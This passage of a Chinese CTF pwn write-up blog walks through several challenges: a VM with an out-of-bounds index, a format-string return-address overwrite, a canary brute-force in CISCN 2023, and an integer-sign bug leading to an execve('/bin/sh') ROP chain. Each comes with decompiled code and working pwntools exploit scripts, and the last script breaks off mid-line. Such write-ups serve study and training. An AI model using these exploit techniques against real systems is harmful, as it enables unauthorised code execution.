href="#5-Approoooooooaching" class="headerlink" title="5. Approoooooooaching"></a>5. Approoooooooaching</h2><p>虚拟机题目，功能有申请堆块、编辑堆块、翻译堆块、执行堆块：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+14h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Hello, world!&quot;</span>);</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Give me your choice: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        add(<span class="string">&quot;%d&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        edit(<span class="string">&quot;%d&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        trans(<span class="string">&quot;%d&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        vm(<span class="string">&quot;%d&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="string">&quot;%d&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error chooice&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> trans 关键代码如下，可知<code>!i$#xy*</code>分别翻译为<code>1234567</code>存储在 bss 段上：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_1269</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 i; <span class="comment">// [rsp+10h] [rbp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 v4; <span class="comment">// [rsp+12h] [rbp-6h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+14h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = *(i + a1);</span><br><span class="line">    <span class="keyword">if</span> ( !*(i + a1) || i &gt; <span class="number">0xFFF</span>u )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="string">&#x27;y&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(&amp;unk_4080 + <span class="number">2</span> * i) = <span class="number">6</span>;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v5 &gt; <span class="number">121</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="string">&#x27;x&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(&amp;unk_4080 + <span class="number">2</span> * i) = <span class="number">5</span>;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v5 &gt; <span class="number">64</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v5 == <span class="string">&#x27;i&#x27;</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        *(&amp;unk_4080 + <span class="number">2</span> * i) = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">LABEL_22:</span><br><span class="line">      --i;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v5 &lt; <span class="number">33</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">    <span class="keyword">switch</span> ( *(i + a1) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;!&#x27;</span>:</span><br><span class="line">        *(&amp;unk_4080 + <span class="number">2</span> * i) = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">        *(&amp;unk_4080 + <span class="number">2</span> * i) = <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;$&#x27;</span>:</span><br><span class="line">        *(&amp;unk_4080 + <span class="number">2</span> * i) = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">        *(&amp;unk_4080 + <span class="number">2</span> * i) = <span class="number">7</span>;</span><br><span class="line">        <span class="keyword">if</span> ( dword_8480 == <span class="number">512</span> )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">        v2 = dword_8480++;</span><br><span class="line">        word_8080[v2] = i;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;@&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> ( !dword_8480 )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">        v4 = word_8080[--dword_8480];</span><br><span class="line">        *(&amp;unk_4080 + <span class="number">2</span> * i) = <span class="number">8</span>;</span><br><span class="line">        word_4082[<span class="number">2</span> * i] = v4;</span><br><span class="line">        word_4082[<span class="number">2</span> * v4] = i;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( dword_8480 || i == <span class="number">4096</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  *(&amp;unk_4080 + <span class="number">2</span> * i) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>vm 关键代码如下，解释的便是 bss 段上翻译后的值，可以发现v3可以减为负值，因此就可以使其指向返回地址，使之增加至返回地址处：</p><p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202307271930237.png" alt="image-20230727193030123"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __fastcall <span class="title function_">sub_151D</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int16 v2; <span class="comment">// [rsp+12h] [rbp-Eh]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0xFFFF</span>;                                </span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( --v3 )<span class="comment">// 循环结束v3置零</span></span><br><span class="line">    *(<span class="number">2LL</span> * v3 + a1) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(&amp;unk_4080 + <span class="number">2</span> * v2) &amp;&amp; v3 &lt;= <span class="number">65534</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> ( *(&amp;unk_4080 + <span class="number">2</span> * v2) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:                                 <span class="comment">// !</span></span><br><span class="line">          ++v3;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:                                 <span class="comment">// i——可越界</span></span><br><span class="line">          --v3;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:                                 <span class="comment">// $</span></span><br><span class="line">          ++*(<span class="number">2LL</span> * v3 + a1);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:                                 <span class="comment">// #</span></span><br><span class="line">          --*(<span class="number">2LL</span> * v3 + a1);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:                                 <span class="comment">// x</span></span><br><span class="line">          <span class="built_in">putchar</span>(*(<span class="number">2LL</span> * v3 + a1));</span><br><span class="line">          <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:                                 <span class="comment">// y——写入</span></span><br><span class="line">          *(<span class="number">2</span> * v3 + a1) = getchar();</span><br><span class="line">          <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:                                 <span class="comment">// *</span></span><br><span class="line">          <span class="keyword">if</span> ( !*(<span class="number">2LL</span> * v3 + a1) )</span><br><span class="line">            v2 = word_4082[<span class="number">2</span> * v2];</span><br><span class="line">          <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">          <span class="keyword">if</span> ( *(<span class="number">2LL</span> * v3 + a1) )</span><br><span class="line">            v2 = word_4082[<span class="number">2</span> * v2];</span><br><span class="line">LABEL_17:</span><br><span class="line">          ++v2;</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> v3 == <span class="number">0xFFFF</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>wp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;sp&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Give me your choice: \n&quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;size: &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">contents</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Give me your choice: \n&quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendafter(<span class="string">&quot;text: &quot;</span>, contents)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trans</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Give me your choice: \n&quot;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vm</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Give me your choice: \n&quot;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./bf&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">100</span>)</span><br><span class="line">edit(<span class="string">&quot;iiii&quot;</span>+<span class="string">&quot;$&quot;</span>*<span class="number">55</span>)</span><br><span class="line">trans()</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io, &#x27;b *$rebase(0x015c2)&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(io, &#x27;b *$rebase(0x0016F6)&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">vm()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>注：奇怪的一点是当<code>i</code>执行完去执行<code>$</code>的时候会吞掉一个<code>$</code>。</p><h2 id="6-fooooood"><a href="#6-fooooood" class="headerlink" title="6. fooooood"></a>6. fooooood</h2><p>非栈上的格式化字符串，有三次格式化字符串机会。在栈上找到二层跳板，便能隔山打牛，但是三次格式化字符串还太少，因此得先增加格式化的次数。具体步骤如下：</p><ol><li>修改栈上的<code>i</code></li><li>修改返回地址</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;sp&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(io, <span class="string">&quot;b *$rebase(0x0B05)&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Give me your name:&quot;</span>, <span class="string">&#x27;%p&#x27;</span>*<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%9$p,%11$p&#x27;</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;your favourite food: &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">lb = <span class="built_in">int</span>(io.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">240</span> - libc.sym[<span class="string">&quot;__libc_start_main&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;lb ==&gt; &quot;</span>+<span class="built_in">hex</span>(lb))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(io.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;stack ==&gt; &quot;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">offset = <span class="number">11</span>+<span class="number">0x1f</span>-<span class="number">5</span></span><br><span class="line">ret_addr = stack - <span class="number">0x7ffce385cb48</span> + <span class="number">0x7ffce385ca68</span></span><br><span class="line">log.success(<span class="string">&quot;ret_addr ==&gt; &quot;</span>+<span class="built_in">hex</span>(ret_addr))</span><br><span class="line">one_gadget = lb + <span class="number">0x45226</span></span><br><span class="line">log.success(<span class="string">&quot;one_gadget ==&gt; &quot;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line"></span><br><span class="line">i_addr = ret_addr - <span class="number">20</span></span><br><span class="line">off = i_addr &amp; <span class="number">0xffff</span></span><br><span class="line">off1 = ret_addr &amp; <span class="number">0xffff</span></span><br><span class="line">off2 = one_gadget &amp; <span class="number">0xffff</span></span><br><span class="line">off3 = (one_gadget &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span></span><br><span class="line">log.success(<span class="string">&quot;i_addr ==&gt; &quot;</span>+<span class="built_in">hex</span>(i_addr))</span><br><span class="line">log.success(<span class="string">&quot;off1 ==&gt; &quot;</span>+<span class="built_in">hex</span>(off1))</span><br><span class="line">log.success(<span class="string">&quot;off2 ==&gt; &quot;</span>+<span class="built_in">hex</span>(off2))</span><br><span class="line">log.success(<span class="string">&quot;off3 ==&gt; &quot;</span>+<span class="built_in">hex</span>(off3))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改i值</span></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(off)</span><br><span class="line">payload += <span class="string">&#x27;%11$hn&#x27;</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;your favourite food: &quot;</span>, payload)</span><br><span class="line">payload = <span class="string">&#x27;%6c&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;%37$hhn&#x27;</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;your favourite food: &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">dbg()</span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(off1)</span><br><span class="line">payload += <span class="string">&#x27;%11$hn&#x27;</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;your favourite food: &quot;</span>, payload)</span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(off2)</span><br><span class="line">payload += <span class="string">&#x27;%37$hn&#x27;</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;your favourite food: &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(off1+<span class="number">2</span>)</span><br><span class="line">payload += <span class="string">&#x27;%11$hn&#x27;</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;your favourite food: &quot;</span>, payload)</span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(off3)</span><br><span class="line">payload += <span class="string">&#x27;%37$hhn&#x27;</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;your favourite food: &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="2023Ciscn初赛"><a href="#2023Ciscn初赛" class="headerlink" title="2023Ciscn初赛"></a>2023Ciscn初赛</h1><h2 id="1-funcanary"><a href="#1-funcanary" class="headerlink" title="1. funcanary"></a>1. funcanary</h2><p>题目比较好懂，阻塞主进程，不断分配子线程进入栈溢出：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309111712221.png" alt="image-20230911171256148" style="zoom:50%;" /><p>有个后门：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309111727373.png" alt="image-20230911172724228" style="zoom:50%;" /><p>由于子进程和主进程是共享 canary 的，因此可以通过子进程不断爆破得到 canary，然后爆破倒数第二位的返回地址为后门函数,，需要注意返回地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&quot;./service&quot;</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x1229</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">104</span> + canary + p8(j)</span><br><span class="line">        io.sendafter(<span class="string">b&quot;\n&quot;</span>, payload)</span><br><span class="line">        info = io.recvuntil(<span class="string">b&quot;welcome&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;stack smashing detected&#x27;</span> <span class="keyword">in</span> info:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            canary += p8(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">log.success(<span class="string">&quot;canary===&gt;&quot;</span>+<span class="built_in">hex</span>(u64(canary)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">104</span> + canary + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">    payload += p8(<span class="number">0x2E</span>) + p8(i)</span><br><span class="line">    io.sendafter(<span class="string">b&quot;\n&quot;</span>, payload)</span><br><span class="line">    info = io.recvuntil(<span class="string">b&#x27;welcome&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> info:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="2-烧烤摊儿"><a href="#2-烧烤摊儿" class="headerlink" title="2. 烧烤摊儿"></a>2. 烧烤摊儿</h2><p>好久没碰到静态链接的题目了。</p><p>菜单题，有一个漏洞后门，导致了栈溢出：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309121517522.png" alt="image-20230912151719396" style="zoom:50%;" /><p>要进入这个漏洞后门需要足够的 money，而用户初始只有 233。由于在买烧烤的时候使用的是 int 变量，所以可以通过输入负数，使得 money 增加：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309121519850.png" alt="image-20230912151950671" style="zoom:50%;" /><p>静态链接中残留了很多 gadget，足够我们打<code>execve(&quot;/bin/sh&quot;, 0, 0)</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span 